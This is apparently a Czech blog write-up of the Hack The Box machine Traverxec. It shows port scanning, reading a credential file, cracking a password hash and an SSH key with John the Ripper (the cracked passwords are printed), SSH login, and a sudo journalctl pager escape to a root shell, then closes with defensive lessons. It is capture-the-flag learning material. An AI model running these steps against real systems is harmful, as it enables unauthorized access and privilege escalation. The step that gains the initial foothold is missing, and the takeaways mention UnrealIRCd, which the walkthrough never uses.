---
layout: post
author: Tomáš Matějíček
title: "Traverxec"
date: 2021-01-27
tags: ssh sudo exploit enumeration privesc hackthebox
---

## Úvod a kontext

Traverxec je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU -T4 -v $IP
```

## Analýza zjištění

### Lámání hesel nebo hashů

Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
```bash
cat /var/nostromo/conf/.htpasswd
```
```
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
/usr/sbin/john Traverxec-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
=> Nowonly4me

http://10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz

/usr/share/john/ssh2john.py Traverxec-ssh/id_rsa > Traverxec-ssh/id_rsa.john

/usr/sbin/john Traverxec-ssh/id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
=> hunter
```

## Získání přístupu

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
ssh -i Traverxec-ssh/id_rsa david@10.10.10.165
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__

/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

změnšit okno aby výpis musel začít stránkovat
!/bin/sh
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- Úvodní sken služeb vymezil reálnou útočnou plochu a pomohl oddělit relevantní stopy od šumu.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.

## Co si odnést do praxe

- Legacy síťové služby typu UnrealIRCd nebo Nostromo je potřeba průběžně vyřazovat a nahrazovat; jejich známé chyby bývají snadno zneužitelné a často dlouho nezalepené.
- SSH klíče, hesla a uložené tokeny je nutné oddělovat mezi účty i službami; znovupoužití přístupů rychle mění lokální únik ve stabilní shell.
- Pravidla `sudo` mají být co nejmenší a bez možnosti ovlivnit příkaz, argumenty nebo prostředí z neprivilegovaného kontextu.
- Backupy, `.bak` soubory a zapomenuté exporty musí být ukládané mimo veřejný webroot; právě ty často odhalí zdrojové kódy, klíče nebo serializační gadgety.